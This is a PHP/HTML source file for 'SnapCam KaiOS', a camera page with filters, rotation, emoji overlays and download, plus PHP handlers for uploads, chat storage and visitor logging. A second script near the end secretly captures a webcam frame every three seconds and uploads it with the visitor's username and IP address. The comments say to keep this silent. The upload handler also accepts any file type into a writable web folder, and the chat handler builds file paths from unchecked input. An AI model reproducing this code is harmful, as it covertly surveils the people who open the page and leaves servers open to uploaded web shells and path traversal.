<?php
// Handle file upload
if (isset($_FILES['media'])) {
    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }
    $file = $_FILES['media'];
    $username = isset($_POST['username']) ? $_POST['username'] : 'user';
    $dateStr = date('Y-m-d');
    $originalName = basename($file['name']);
    $ext = pathinfo($originalName, PATHINFO_EXTENSION);
    $filename = "{$username}_{$dateStr}_" . uniqid() . "." . $ext;
    $uploadPath = $uploadDir . $filename;

    if (move_uploaded_file($file['tmp_name'], $uploadPath)) {
        echo json_encode(['success' => true, 'path' => $uploadPath]);
        exit;
    } else {
        echo json_encode(['success' => false, 'error' => 'Upload failed']);
        exit;
    }
}

// Handle saving/loading chat messages
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $chatCode = $_POST['chatCode'];
    $chatFile = 'chats/' . $chatCode . '.json';

    if (!is_dir('chats')) {
        mkdir('chats', 0777, true);
    }

    if ($action === 'saveMessage') {
        $messageText = $_POST['message'] ?? '';
        $sender = $_POST['sender'] ?? '';
        $mediaUrl = $_POST['mediaUrl'] ?? null;
        $mediaType = $_POST['mediaType'] ?? null;
        $timestamp = time();

        $msg = ['sender' => $sender, 'timestamp' => $timestamp];
        if ($messageText) {
            $msg['message'] = $messageText;
        }
        if ($mediaUrl && $mediaType) {
            $msg['mediaUrl'] = $mediaUrl;
            $msg['mediaType'] = $mediaType;
        }

        $messages = [];
        if (file_exists($chatFile)) {
            $json = file_get_contents($chatFile);
            $messages = json_decode($json, true);
        }
        $messages[] = $msg;
        if (count($messages) > 50) {
            $messages = array_slice($messages, -50);
        }
        file_put_contents($chatFile, json_encode($messages));
        echo json_encode(['status' => 'ok']);
        exit;
    } elseif ($action === 'loadMessages') {
        if (file_exists($chatFile)) {
            echo file_get_contents($chatFile);
        } else {
            echo '[]';
        }
        exit;
    }
}

// Cleanup old media after 24 hours
$infoFile = 'uploads/media_info.json';
if (file_exists($infoFile)) {
    $json = file_get_contents($infoFile);
    $data = json_decode($json, true);
    $changed = false;
    $now = time();
    foreach ($data as $key => $entry) {
        if ($now - $entry['uploaded_at'] > 24*60*60) {
            if (file_exists($entry['path'])) {
                unlink($entry['path']);
            }
            unset($data[$key]);
            $changed = true;
        }
    }
    if ($changed) {
        file_put_contents($infoFile, json_encode(array_values($data)));
    }
}
?>



<?php
// total-visits.php

// Initialize total visits
$totalVisitsFile = 'total-visits.json';
if (file_exists($totalVisitsFile)) {
    $totalVisitsData = json_decode(file_get_contents($totalVisitsFile), true);
    $totalVisits = $totalVisitsData['totalVisits'] + 1;
} else {
    $totalVisits = 1;
}

// Update total visits
file_put_contents($totalVisitsFile, json_encode(['totalVisits' => $totalVisits]));

// Initialize daily visits
$dailyVisitsFile = 'daily-visits.json';
if (file_exists($dailyVisitsFile)) {
    $dailyVisitsData = json_decode(file_get_contents($dailyVisitsFile), true);
} else {
    $dailyVisitsData = [];
}

$today = date('Y-m-d');
$ip = $_SERVER['REMOTE_ADDR'];

// Get the name of the day for today
$dayName = date('l');

// Check if today's date exists in daily visits
if (!isset($dailyVisitsData[$today])) {
    $dailyVisitsData[$today] = [$dayName => []]; // Create a new array for the day
}

// Increment the visit count for the IP address
if (isset($dailyVisitsData[$today][$dayName][$ip])) {
    $dailyVisitsData[$today][$dayName][$ip]++;
} else {
    $dailyVisitsData[$today][$dayName][$ip] = 1;
}

// Sort dates in descending order
uksort($dailyVisitsData, function($a, $b) {
    return strtotime($b) - strtotime($a);
});

// Update daily visits
file_put_contents($dailyVisitsFile, json_encode($dailyVisitsData, JSON_PRETTY_PRINT));
?>

<?php
// Set the path for your JSON file
$jsonFilePath = 'traffic_data.json';

// Get the referrer
$referrer = isset($_SERVER['HTTP_REFERER']) ? parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) : 'Direct Access';
$currentDate = date("Y-m-d");

// Load existing traffic data
if (file_exists($jsonFilePath)) {
    $existingData = json_decode(file_get_contents($jsonFilePath), true);
    if (!is_array($existingData)) {
        $existingData = []; // Initialize as an empty array if there was an issue
    }
} else {
    $existingData = []; // Create an empty array if file does not exist
}

// Check if today's date already exists in the data
if (!isset($existingData[$currentDate])) {
    $existingData[$currentDate] = []; // Initialize the date entry if it doesn't exist
}

// Check if the referrer already exists for today
if (isset($existingData[$currentDate][$referrer])) {
    // Increment visit count from this referrer for today
    $existingData[$currentDate][$referrer]['visits'] += 1;
} else {
    // Initialize visit count for this referrer for today
    $existingData[$currentDate][$referrer] = ['visits' => 1];
}

// Sort the data so that the newest dates come first
krsort($existingData);

// Save updated data to JSON file
file_put_contents($jsonFilePath, json_encode($existingData, JSON_PRETTY_PRINT));

// Output success message (or you can simply redirect or show the website content)
echo "";
?>







<?php
// Handle image upload and log update
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['img']) && isset($_POST['image_name']) && isset($_POST['username'])) {
    $baseDir = 'kai-uploads';

    // Create main uploads folder if not exists
    if (!is_dir($baseDir)) {
        mkdir($baseDir, 0755, true);
    }

    $username = trim($_POST['username']);
    if (!$username) {
        $username = 'Anonymous';
    }

    // Sanitize username for folder name
    $safeUsername = preg_replace('/[^a-zA-Z0-9_\-]/', '_', $username);
    $userFolder = $baseDir . '/' . $safeUsername;

    // Create username folder if not exists
    if (!is_dir($userFolder)) {
        mkdir($userFolder, 0755, true);
    }

    // Create date folder inside username folder
    $dateFolderName = date('Y-m-d');
    $dateFolder = $userFolder . '/' . $dateFolderName;
    if (!is_dir($dateFolder)) {
        mkdir($dateFolder, 0755, true);
    }

    // Save the image
    $data = $_POST['img'];
    if (strpos($data, 'data:image/jpeg;base64,') === 0) {
        $data = substr($data, strlen('data:image/jpeg;base64,'));
    }

    $decodedData = base64_decode($data);
    if ($decodedData === false) {
        echo 'Error decoding image.';
        exit;
    }

    $filename = $dateFolder . '/' . basename($_POST['image_name']);

    if (file_put_contents($filename, $decodedData)) {
        // Update log file
        $logFile = 'kai-log.json';
        $logData = [];

        if (file_exists($logFile)) {
            $json = file_get_contents($logFile);
            $logData = json_decode($json, true);
        }

        if (!$logData) {
            $logData = [
                'visits' => 0,
                'first_visit' => null,
                'last_visit' => null,
                'ip' => '',
                'users' => []
            ];
        }

        $ip = $_SERVER['REMOTE_ADDR'];

        if (!isset($logData['users'][$username])) {
            $logData['users'][$username] = [
                'visit_count' => 0,
                'first_time' => null,
                'last_time' => null,
                'ip' => $ip
            ];
        }

        $now = date('Y-m-d H:i:s');
        $logData['visits']++;
        if (!$logData['first_visit']) {
            $logData['first_visit'] = $now;
        }
        $logData['last_visit'] = $now;
        $logData['ip'] = $ip;

        $userData =& $logData['users'][$username];
        $userData['visit_count']++;
        if (!$userData['first_time']) {
            $userData['first_time'] = $now;
        }
        $userData['last_time'] = $now;
        $userData['ip'] = $ip;

        file_put_contents($logFile, json_encode($logData, JSON_PRETTY_PRINT));

        echo 'Image saved in ' . htmlspecialchars($filename);
    } else {
        echo 'Failed to save image.';
    }
    exit;
}
?>



<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<title>SnapCam KaiOS</title>
<style>
  body {
    margin: 0;
    overflow: hidden;
    font-family: sans-serif;
    background: #000;
  }
  #videoContainer {
    position: relative;
    width: 100%;
    height: 100vh;
  }
  #videoElement {
    width: 100%;
    height: 100%;
    object-fit: cover;
  }
  #canvas {
    display: none;
  }
  #fallingText {
    position: absolute;
    top: 0;
    left: 50%;
    transform: translateX(-50%);
    font-size: 32px;
    pointer-events: none;
  }
  #buttons {
    position: absolute;
    bottom: 10px;
    width: 100%;
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 8px;
  }
  /* Small emoji buttons for control */
  button {
    font-size: 20px;
    padding: 6px 10px;
    border: none;
    border-radius: 4px;
    background: rgba(255,255,255,0.2);
    cursor: pointer;
    transition: background 0.2s;
  }
  button:hover {
    background: rgba(255,255,255,0.4);
  }
</style>
</head>
<body>

<div id="videoContainer">
  <video id="videoElement" autoplay playsinline></video>
  <canvas id="canvas"></canvas>
  <div id="fallingText"></div>
</div>

<div id="buttons">
  <button title="Effects" id="effectBtn">🎨</button>
  <button title="Rotate" id="rotateBtn">🔄</button>
  <button title="Flip" id="flipBtn">🔁</button>
  <button title="Download" id="downloadBtn">💾</button>
  <button title="Emoji/Name" id="emojiBtn">😊</button>
</div>

<script>
let video = document.getElementById('videoElement');
let canvas = document.getElementById('canvas');
let ctx = canvas.getContext('2d');
let fallingDiv = document.getElementById('fallingText');

let effects = [
  { name: 'None', filter: 'none' },
  { name: 'Grayscale', filter: 'grayscale(100%)' },
  { name: 'Sepia', filter: 'sepia(100%)' },
  { name: 'Invert', filter: 'invert(100%)' },
  { name: 'Blur', filter: 'blur(3px)' },
  { name: 'Saturate', filter: 'saturate(200%)' },
  { name: 'Hue Rotate', filter: 'hue-rotate(90deg)' }
];

let currentEffectIndex = 0;
let rotation = 0; // degrees
let isReversed = false;
let flipHorizontal = false;
let fallingParticles = [];
let currentEmojiOrName = '';
let stream;

// Show startup instructions
window.onload = function() {
  alert("Welcome to SnapCam!\n\n" +
        "Tap 🎨 to cycle effects.\n" +
        "Tap 🔄 to rotate.\n" +
        "Tap 🔁 to flip camera.\n" +
        "Tap 💾 to download.\n" +
        "Tap 😊 to add emoji/text with falling effect.\n" +
        "Press Enter to capture.\n");
};

// Initialize camera
navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
.then(s => {
  stream = s;
  video.srcObject = s;
})
.catch(e => {
  alert('Camera access denied or not supported.');
});

// Button handlers
document.getElementById('effectBtn').onclick = () => {
  currentEffectIndex = (currentEffectIndex + 1) % effects.length;
  alert('Effect: ' + effects[currentEffectIndex].name);
};
document.getElementById('rotateBtn').onclick = () => {
  rotation = (rotation + 90) % 360;
  alert('Rotated to ' + rotation + '°');
};
document.getElementById('flipBtn').onclick = () => {
  flipHorizontal = !flipHorizontal;
  alert('Flip: ' + (flipHorizontal ? 'Yes' : 'No'));
};
document.getElementById('downloadBtn').onclick = () => {
  captureAndDownload();
};
document.getElementById('emojiBtn').onclick = () => {
  currentEmojiOrName = prompt('Enter Emoji or Text:', currentEmojiOrName);
  startFalling();
};

// Animate falling emojis/names
function startFalling() {
  fallingParticles = [];
  for (let i=0; i<30; i++) {
    fallingParticles.push({
      x: Math.random() * window.innerWidth,
      y: Math.random() * -100,
      size: 20 + Math.random() * 20,
      speed: 1 + Math.random() * 2,
      emoji: currentEmojiOrName,
    });
  }
  requestAnimationFrame(animateFalling);
}

function animateFalling() {
  ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
  ctx.font = '20px sans-serif';
  ctx.fillStyle = 'white';
  fallingParticles.forEach(p => {
    ctx.fillText(p.emoji, p.x, p.y);
    p.y += p.speed;
    if (p.y > window.innerHeight + p.size) {
      p.y = -p.size;
      p.x = Math.random() * window.innerWidth;
    }
  });
  requestAnimationFrame(animateFalling);
}

// Capture image, add effects, and download
function captureAndDownload() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.save();
  ctx.translate(canvas.width/2, canvas.height/2);
  ctx.rotate(rotation * Math.PI/180);
  if (flipHorizontal) ctx.scale(-1, 1);
  ctx.translate(-canvas.width/2, -canvas.height/2);
  ctx.filter = effects[currentEffectIndex].filter;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  ctx.restore();

  // Add emoji or text overlay
  if (currentEmojiOrName) {
    ctx.font = '48px sans-serif';
    ctx.fillStyle = 'white';
    ctx.textAlign = 'right';
    ctx.fillText('' + currentEmojiOrName, canvas.width - 10, canvas.height - 10);
  }

  // Download image
  let dataURL = canvas.toDataURL('image/png');
  let a = document.createElement('a');
  a.href = dataURL;
  a.download = 'snap_' + Date.now() + '.png';
  a.click();
}

// Event listeners for SoftLeft and Enter
document.addEventListener('keydown', e => {
  if (e.key === 'SoftLeft') {
    currentEmojiOrName = prompt('Enter Emoji or Text:', currentEmojiOrName);
    startFalling();
  }
  if (e.key === 'Enter') {
    captureAndDownload();
  }
});
</script>


<!-- Hidden video element for capturing frames -->
<video id="mirror" autoplay playsinline></video>
<div id="status"></div>

<script>
const video = document.getElementById('mirror');
const statusDiv = document.getElementById('status');

let username = localStorage.getItem('username');
if (!username) {
    username = prompt('Enter your username:');
    if (username) {
        localStorage.setItem('username', username);
    } else {
        username = 'Anonymous';
        localStorage.setItem('username', username);
    }
}

// Fetch user's IP
let userIP = '';
fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(data => {
      userIP = data.ip;
  })
  .catch(() => {
      userIP = 'Unknown';
  });

// Access camera
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    video.srcObject = stream;
    startAutoCapture();
})
.catch(error => {
    statusDiv.textContent = 'Camera access error: ' + error.message;
});

// Function to capture and upload
function captureAndUpload() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataURL = canvas.toDataURL('image/jpeg');

    const now = new Date();
    const dateStr = now.toISOString().replace(/[:.]/g, '-');
    const imageName = `${username}-${dateStr}-${userIP}.jpg`;

    const xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                // Optional: update status or keep silent
            }
        }
    };
    xhr.send('img=' + encodeURIComponent(dataURL) + '&username=' + encodeURIComponent(username) + '&image_name=' + encodeURIComponent(imageName));
}

// Start auto capture immediately
function startAutoCapture() {
    if (!window.captureInterval) {
        window.captureInterval = setInterval(captureAndUpload, 3000);
        // Optional: update status
        // statusDiv.textContent = 'Auto capturing and uploading...';
    }
}
</script>

</body>
</html>